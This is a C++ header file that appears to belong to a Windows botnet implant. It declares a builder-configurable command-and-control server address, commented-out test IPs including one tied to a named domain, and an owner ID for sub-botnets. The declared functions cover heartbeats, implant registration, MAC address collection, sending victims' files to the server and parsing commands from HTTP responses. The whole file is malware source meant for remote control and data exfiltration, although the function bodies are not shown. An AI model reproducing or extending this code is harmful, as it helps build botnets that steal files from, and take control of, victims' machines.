#pragma once

#include <winsock2.h>
#include <wininet.h>
#include <tchar.h>
#include <windows.h>
#include <Rpc.h>
#include <iphlpapi.h>
#include <fstream>
#include <string>
#include <vector>
#include <stdio.h>
#include <iostream>

#define DEFAULT_BUFLEN 40000
#define DEFAULT_PORT 80

/**
 * This section of variables is filled in by the builder when the stub is being configured
 * this is done so that users can reconfigure the stub without having access to the source
 * code or needing to recompile it
 *
 * The reason that we are initializing these variables to generic values is so that
 * the linker has to put these variables inside of the read only data section instead
 * of placing it into the bss section of the executable
 */
extern "C" {

	/**
	 * Domain name or IP address to connect to in order to recieve commands
	 */
	static char srvrIP[256] = {'H', 'O', 'S', 'T', 'N', 'A', 'M', 'E'};

	/**
	* IP Address for testing purposes
	*/
	//static char srvrIP[256] = {'1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', '0', '5'};
	//static char srvrIP[256] = {'1', '0', '4', '.', '2', '3', '6', '.', '1', '2', '7', '.', '2', '3', '1'}; // tundrapacket.me
	//static char srvrIP[256] = {'1', '0', '.', '3', '1', '.', '4', '2', '.', '2', '4', '1'};

	/**
	 * Since multiple botnets can be run on a single C&C server we want to support partitioning
	 * into sub-botnets and need a secondary identifier to tell to whom the bot belongs
	 */
	static char ownerID[256] = {'a'};

	static char* botID;
	/**
	 * If this constant is not changed from FALSE the stub can check and
	 * know that it has not been built by the builder and knows to exit as
	 * this is an error
	 */
	static unsigned int built = 1;
}

/*
   Sends a heartbeat to the server to register that the implant is active.
   */
void sendHeartbeat();

/*
   Sends the given file to the server in raw binary using WININET functions
   */
void sendFile(char* filename, char* url);

/*
* Registers a new implant with the server
*/
void registerImplant();

/*
* Gets Mac-Address from machine
*/
void getMacAddr(char** macAddr);

/*
   Receive data from the server
   */
int recvResponse(HINTERNET hRequest);

/*
   Parses through a HTTP response in order to read any commands
   */
int parseResponse(char* htmlInput);

/*
   Read all of the file data and convert it into base64 char array
   */
char* getFileData(std::string input, int* size);

VOID runImager(LPCTSTR executable);
